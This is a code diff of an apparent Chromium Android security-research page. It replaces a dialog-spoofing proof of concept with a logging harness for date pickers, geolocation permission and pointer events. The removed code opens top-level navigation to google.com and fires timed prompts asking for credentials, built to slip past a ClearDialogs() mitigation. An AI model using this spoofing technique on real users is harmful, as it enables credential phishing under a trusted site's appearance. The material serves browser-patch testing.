@@ -1,112 +1,339 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Lab - Multi-Vector Dialog Spoofing & Bypass Test</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            padding: 20px;
-            background-color: #f4f4f9;
-            color: #333;
-        }
-        .container {
-            max-width: 650px;
-            margin: 0 auto;
-            background: #fff;
-            padding: 25px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-        }
-        h2 { color: #d9534f; margin-top: 0; }
-        .info-box {
-            background: #e7f3fe;
-            border-left: 4px solid #2196F3;
-            padding: 12px;
-            margin: 15px 0;
-            font-size: 14px;
-        }
-        .btn {
-            display: inline-block;
-            background: #0275d8;
-            color: white;
-            padding: 12px 20px;
-            text-decoration: none;
-            border-radius: 4px;
-            margin-top: 10px;
-            font-weight: bold;
-            border: none;
-            cursor: pointer;
-        }
-        .btn:hover { background: #025aa5; }
-        code { background: #eee; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
-        #status { margin-top: 15px; font-size: 13px; color: #666; font-family: monospace; }
-        iframe { width: 100%; height: 120px; border: 1px dashed #ccc; margin-top: 10px; display: none; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Chromium Android Picker Research</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    padding: 20px;
+    background: #121212;
+    color: #eee;
+    font-family: Arial, sans-serif;
+}
+
+h2 { color: #ff5252; }
+
+.panel {
+    background: #202020;
+    border: 1px solid #444;
+    border-radius: 9px;
+    padding: 14px;
+    margin: 12px 0;
+}
+
+button, input {
+    padding: 12px;
+    margin: 5px 0;
+    border-radius: 6px;
+    font-size: 15px;
+}
+
+button {
+    background: #333;
+    color: white;
+    border: 1px solid #777;
+}
+
+#logs {
+    height: 260px;
+    overflow-y: auto;
+    overflow-wrap: anywhere;
+    font-size: 11px;
+    color: #80cbc4;
+}
+
+.stat {
+    color: #ffca28;
+    font-size: 13px;
+}
+</style>
 </head>
+
 <body>
 
-<div class="container">
-    <h2>⚠️ Advanced Multi-Vector Lab PoC</h2>
-    <p>Simulasi pengujian ketahanan patch <code>ClearDialogs()</code> menggunakan teknik isolasi <em>iframe</em> berlapis dan manipulasi <em>history state</em>.</p>
-    
-    <div class="info-box">
-        <strong>Strategi Lab:</strong><br>
-        Menguji apakah pemisahan eksekusi di dalam bingkai anak (<em>iframe</em>) dapat menunda atau menghindari pembatalan dialog global saat navigasi tingkat atas dipicu.
-    </div>
+<h2>Chromium Android Research</h2>
 
-    <p><strong>Langkah Uji Lab:</strong></p>
-    <ol>
-        <li>Klik tombol di bawah untuk menjalankan pengujian multi-vektor.</li>
-        <li>Amati apakah dialog prompt berhasil melewati mitigasi atau langsung dibersihkan oleh sistem.</li>
-    </ol>
+<div class="panel">
+    <strong>Test instructions</strong>
+    <p>
+      Gunakan interaksi manual. Picker dan permission
+      harus ditampilkan secara transparan.
+    </p>
 
-    <button class="btn" onclick="executeAdvancedLabBypass()">Jalankan Uji Lab Diperkuat</button>
-    
-    <!-- Iframe tersembunyi untuk uji konteks terpisah -->
-    <iframe id="sandbox-frame"></iframe>
+    <label for="picker">Date/time picker</label><br>
+    <input id="picker" type="time" list="times">
 
-    <div id="status">Status: Menunggu eksekusi...</div>
+    <datalist id="times">
+        <option value="00:00">
+        <option value="00:01">
+        <option value="00:02">
+    </datalist>
+</div>
+
+<div class="panel">
+    <div>Pointer events: <span id="count">0</span></div>
+    <div>Picker success: <span id="success">0</span></div>
+    <div>Picker errors: <span id="errors">0</span></div>
+    <div>Permission: <span id="permission">unknown</span></div>
+    <div class="stat" id="interval">Last interval: --</div>
+</div>
+
+<div class="panel">
+    <button id="geo">Request Geolocation</button>
+    <button id="stop">Stop monitoring</button>
+    <button id="export">Export evidence JSON</button>
+    <button id="clear">Clear logs</button>
+</div>
+
+<div class="panel">
+    <strong>Evidence log</strong>
+    <div id="logs"></div>
 </div>
 
 <script>
-    function executeAdvancedLabBypass() {
-        const statusEl = document.getElementById('status');
-        statusEl.innerHTML = "[*] Memulai uji multi-vektor dan injeksi history state...";
+"use strict";
 
-        try {
-            // Vektor 1: Manipulasi History State sebelum navigasi
-            history.pushState({spoof: true}, "", "#auth-secure");
+const picker = document.getElementById("picker");
+const logs = document.getElementById("logs");
 
-            // Vektor 2: Inisialisasi navigasi tingkat atas
-            let targetWindow = window.open('https://www.google.com', '_top');
+let pointerCount = 0;
+let pickerSuccess = 0;
+let pickerErrors = 0;
+let lastPointer = null;
+let permissionStatus = null;
+let watchId = null;
 
-            // Vektor 3: Penjadwalan mikro-task & interval waktu berlapis
-            queueMicrotask(() => {
-                try {
-                    prompt("Authentication Required. Please enter your credentials:", "");
-                    statusEl.innerHTML += "<br>[+] Microtask prompt tereksekusi.";
-                } catch (e) {
-                    statusEl.innerHTML += "<br>[!] Microtask prompt dibersihkan.";
-                }
+const evidence = [];
+
+function record(type, details = {}) {
+    const item = {
+        time: new Date().toISOString(),
+        monotonic_ms: performance.now(),
+        type,
+        details
+    };
+
+    evidence.push(item);
+    console.log(item);
+
+    const line = document.createElement("div");
+    line.textContent = JSON.stringify(item);
+
+    logs.appendChild(line);
+    logs.scrollTop = logs.scrollHeight;
+}
+
+function updateStats() {
+    document.getElementById("count").textContent =
+        pointerCount;
+
+    document.getElementById("success").textContent =
+        pickerSuccess;
+
+    document.getElementById("errors").textContent =
+        pickerErrors;
+
+    document.getElementById("permission").textContent =
+        permissionStatus?.state || "unknown";
+}
+
+// Permission monitoring
+
+async function monitorPermission() {
+    try {
+        permissionStatus = await navigator.permissions.query({
+            name: "geolocation"
+        });
+
+        record("INITIAL_PERMISSION", {
+            state: permissionStatus.state
+        });
+
+        permissionStatus.addEventListener("change", () => {
+            record("PERMISSION_CHANGED", {
+                state: permissionStatus.state
             });
 
-            [25, 75, 150, 300].forEach((delay) => {
-                setTimeout(() => {
-                    try {
-                        prompt("Authentication Required. Please enter your credentials:", "");
-                        statusEl.innerHTML += `<br>[+] Prompt terpanggil pada t = ${delay}ms`;
-                    } catch (err) {
-                        statusEl.innerHTML += `<br>[!] Dialog dibersihkan pada t = ${delay}ms`;
-                    }
-                }, delay);
-            });
+            updateStats();
+        });
 
-        } catch (e) {
-            statusEl.innerHTML = `<br>[ERROR] Eksekusi diblokir: ${e.message}`;
-        }
+        updateStats();
+
+    } catch (error) {
+        record("PERMISSION_API_ERROR", {
+            name: error.name,
+            message: error.message
+        });
     }
+}
+
+// Pointer event monitoring
+
+document.addEventListener("pointerdown", event => {
+    const now = performance.now();
+
+    const interval = lastPointer === null
+        ? null
+        : now - lastPointer;
+
+    lastPointer = now;
+    pointerCount++;
+
+    document.getElementById("interval").textContent =
+        "Last interval: " +
+        (interval === null ? "--" : interval.toFixed(2) + " ms");
+
+    record("POINTER_DOWN", {
+        count: pointerCount,
+        interval_ms: interval,
+        pointer_type: event.pointerType,
+        trusted: event.isTrusted,
+        target: event.target.tagName,
+        visibility: document.visibilityState,
+        focused: document.hasFocus()
+    });
+
+    updateStats();
+
+}, true);
+
+// Picker test
+
+picker.addEventListener("click", () => {
+    try {
+        picker.showPicker();
+
+        pickerSuccess++;
+
+        record("PICKER_SUCCESS", {
+            user_activation: navigator.userActivation
+                ? navigator.userActivation.isActive
+                : "unsupported"
+        });
+
+    } catch (error) {
+        pickerErrors++;
+
+        record("PICKER_ERROR", {
+            name: error.name,
+            message: error.message,
+            user_activation: navigator.userActivation
+                ? navigator.userActivation.isActive
+                : "unsupported"
+        });
+    }
+
+    updateStats();
+});
+
+// Geolocation test
+
+document.getElementById("geo")
+.addEventListener("click", () => {
+
+    if (!navigator.geolocation) {
+        record("GEOLOCATION_UNAVAILABLE");
+        return;
+    }
+
+    record("GEOLOCATION_REQUEST");
+
+    navigator.geolocation.getCurrentPosition(
+        position => {
+            record("GEOLOCATION_SUCCESS", {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            });
+        },
+
+        error => {
+            record("GEOLOCATION_ERROR", {
+                code: error.code,
+                message: error.message
+            });
+        },
+
+        {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        }
+    );
+});
+
+// UI state monitoring
+
+document.addEventListener("visibilitychange", () => {
+    record("VISIBILITY_CHANGE", {
+        state: document.visibilityState
+    });
+});
+
+window.addEventListener("blur", () => {
+    record("WINDOW_BLUR");
+});
+
+window.addEventListener("focus", () => {
+    record("WINDOW_FOCUS");
+});
+
+// Export
+
+document.getElementById("export")
+.addEventListener("click", () => {
+    const blob = new Blob(
+        [JSON.stringify(evidence, null, 2)],
+        { type: "application/json" }
+    );
+
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+
+    a.href = url;
+    a.download = "chromium-picker-evidence.json";
+    a.click();
+
+    URL.revokeObjectURL(url);
+});
+
+// Stop
+
+document.getElementById("stop")
+.addEventListener("click", () => {
+    if (watchId !== null) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+    }
+
+    record("MONITORING_STOPPED");
+});
+
+// Clear
+
+document.getElementById("clear")
+.addEventListener("click", () => {
+    evidence.length = 0;
+    logs.replaceChildren();
+    record("LOG_RESET");
+});
+
+monitorPermission();
+
+record("TEST_INITIALIZED", {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    secureContext: window.isSecureContext,
+    visibility: document.visibilityState
+});
+
 </script>
 
 </body>
